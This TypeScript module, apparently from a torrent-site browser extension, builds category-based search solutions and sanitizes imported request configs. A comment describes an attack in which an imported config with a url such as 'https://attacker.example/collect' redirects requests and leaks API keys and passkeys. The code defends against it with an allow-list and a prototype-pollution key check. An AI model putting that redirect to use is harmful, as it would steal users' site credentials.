import { nanoid } from "nanoid";
import { isEqual } from "es-toolkit";
import type { AxiosRequestConfig } from "axios";
import type { ISearchCategories, TSelectSearchCategoryValue, TSiteID } from "@ptd/site";

import { useMetadataStore } from "@/options/stores/metadata.ts";
import type { ISearchSolution } from "@/shared/types/storages/metadata.ts";
import { buildSearchSolutionFromCategories } from "@/options/utils/searchSolutionConfig.ts";

const metadataStore = useMetadataStore();

export const radioDefault = Symbol("default");

export type TSelectCategory = Record<ISearchCategories["key"], TSelectSearchCategoryValue | symbol>;

export async function getSiteMetaCategory(siteId: TSiteID): Promise<ISearchCategories[]> {
  return (await metadataStore.getSiteMergedMetadata(siteId, "category", []))!;
}

export function isDefaultCategory(field: TSelectSearchCategoryValue | symbol) {
  return Array.isArray(field) ? field.length === 0 : field === radioDefault;
}

export async function generateSiteSearchSolution(
  siteId: TSiteID,
  selectCategory: TSelectCategory,
): Promise<ISearchSolution> {
  let id = nanoid(); // 通过这种panel生成的solution，其 entries 只有一个值，所以可以直接将id作为entries的id
  const searchSolution: ISearchSolution = {
    id,
    siteId: siteId,
    selectedCategories: {},
    searchEntries: {},
  };

  const siteMetaCategory = await getSiteMetaCategory(siteId);

  // 将selectCategory按照siteMetaCategory的顺序转换为searchEntries，并合并成一个规则，合并方法参照ISearchCategories的说明
  const { selectedCategories, requestConfig: entriesConfig } = buildSearchSolutionFromCategories(
    siteMetaCategory,
    selectCategory,
  );
  searchSolution.selectedCategories = selectedCategories;

  if (Object.keys(entriesConfig).length > 0) {
    searchSolution.searchEntries![id] = entriesConfig;
  } else {
    searchSolution.id = "default";
    searchSolution.searchEntries = {};
  }

  return searchSolution;
}

function getCategory(siteMetaCategory: ISearchCategories[], key: string) {
  return siteMetaCategory.find((x) => x.key === key) ?? { key, name: key, options: [] };
}

export function getCategoryName(siteMetaCategory: ISearchCategories[], key: string) {
  return getCategory(siteMetaCategory, key)?.name ?? key;
}

export function getCategoryOptionName(
  siteMetaCategory: ISearchCategories[],
  key: string,
  value: string | number | (string | number)[],
) {
  const options = getCategory(siteMetaCategory, key)?.options ?? [];
  if (Array.isArray(value)) {
    return value.map((v) => options.find((o) => o.value === v)?.name ?? v).join(", ");
  } else {
    return options.find((o) => o.value === value)?.name ?? value;
  }
}

/**
 * F2-High-14 / N5：导入 / 自定义方案时 `searchEntries[*].requestConfig` 只允许 `params` / `data`。
 *
 * 这条 requestConfig 会被 `AbstractBittorrentSite` 用 `toMerged` 合并进最终 axios 配置，而 `request()`
 * 只补 `baseURL` / `url` 的缺省值（没有 `allowAbsoluteUrls:false`）。若导入文件里带
 * `{ url: "https://attacker.example/collect" }` 或 `baseURL` / `headers`，请求（以及站点覆写注入的
 * API key / passkey）就会被改写到外部地址。导入文件来自外部，不能信任，这里统一剥离。
 *
 * 只保留对象形态的 `params` / `data`；数组 / 字符串等形态也一并丢弃（正常导出不会出现）。
 */
export const ALLOWED_SEARCH_REQUEST_CONFIG_KEYS = ["params", "data"] as const;

export interface ISearchEntryRequestConfigSanitizeResult {
  /** 剥离后的安全配置；undefined 表示不需要/无法保留 requestConfig */
  requestConfig: Partial<AxiosRequestConfig> | undefined;
  /** 被剥离的字段名（用于提示用户 / 测试断言） */
  removedKeys: string[];
}

export function sanitizeSearchEntryRequestConfig(requestConfig: unknown): ISearchEntryRequestConfigSanitizeResult {
  if (requestConfig === undefined) {
    return { requestConfig: undefined, removedKeys: [] };
  }

  if (typeof requestConfig !== "object" || requestConfig === null || Array.isArray(requestConfig)) {
    return { requestConfig: undefined, removedKeys: ["requestConfig"] };
  }

  const removedKeys: string[] = [];
  const sanitized: Record<string, any> = {};
  for (const [key, value] of Object.entries(requestConfig as Record<string, unknown>)) {
    if (!(ALLOWED_SEARCH_REQUEST_CONFIG_KEYS as readonly string[]).includes(key)) {
      removedKeys.push(key);
      continue;
    }
    if (typeof value === "object" && value !== null && !Array.isArray(value)) {
      sanitized[key] = value;
    } else {
      removedKeys.push(key);
    }
  }

  return { requestConfig: sanitized as Partial<AxiosRequestConfig>, removedKeys };
}

/** 导入方案 `searchEntries` 的条目名是否安全（防原型污染 / 非法 entry key） */
export function isSafeSearchEntryKey(key: string): boolean {
  return key !== "__proto__" && key !== "constructor" && key !== "prototype";
}

/**
 * F2-Low-N7：判断「同一站点、同一方案条目」是否重复。
 *
 * 旧判定要求 `selectedCategories` 非空或存在 `name`，而分类全取默认时两者都为空 →
 * 连点两次「添加」会出现两条完全相同的 `{ id: "default", siteId }` 条目。
 * 这里按「有分类比分类、无分类比 name」的规范化规则比较。
 */
export function isDuplicateSearchSolution(existing: ISearchSolution, incoming: ISearchSolution): boolean {
  if (existing.siteId !== incoming.siteId) return false;

  const incomingCategories = incoming.selectedCategories ?? {};
  if (Object.keys(incomingCategories).length > 0) {
    return isEqual(existing.selectedCategories ?? {}, incomingCategories);
  }

  return (existing.name ?? "") === (incoming.name ?? "");
}
